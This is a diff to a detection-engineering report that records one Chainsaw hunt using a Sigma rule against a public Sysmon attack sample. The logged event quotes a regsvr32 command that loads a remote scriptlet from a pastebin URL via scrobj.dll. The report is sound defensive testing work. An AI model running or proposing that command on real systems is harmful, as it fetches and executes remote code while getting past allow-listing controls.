@@ -37,3 +37,13 @@ Test against suitable, authorized process-creation telemetry containing relevant
 
 ## Conclusion
 Rule 015 passed Sigma CLI validation. No matching events were found in the available datasets. Further testing is required to assess detection effectiveness.
+
+
+## Validation on public attack sample (Chainsaw v2.17.1)
+
+- Sample: exec_sysmon_lobin_regsvr32_sct.evtx (EVTX-ATTACK-SAMPLES, copied to datasets/extra/)
+- Command: chainsaw.exe --no-banner hunt datasets\extra\exec_sysmon_lobin_regsvr32_sct.evtx -s sigma_rules\rule_015_*.yml --mapping mappings\sigma-event-logs-all.yml --json
+- Result: 1 detection(s)
+- Event: 2019-05-12 18:35:05.140 UTC: regsvr32.exe /u /s /i:http://pastebin.com/raw/H4A4iDTA scrobj.dll, parent cmd.exe
+- Evidence: data_dictionary/evidence_rule015_extra.json
+- Limitations: single public sample, no benign baseline, false-positive rate untested, not run in a live SIEM.
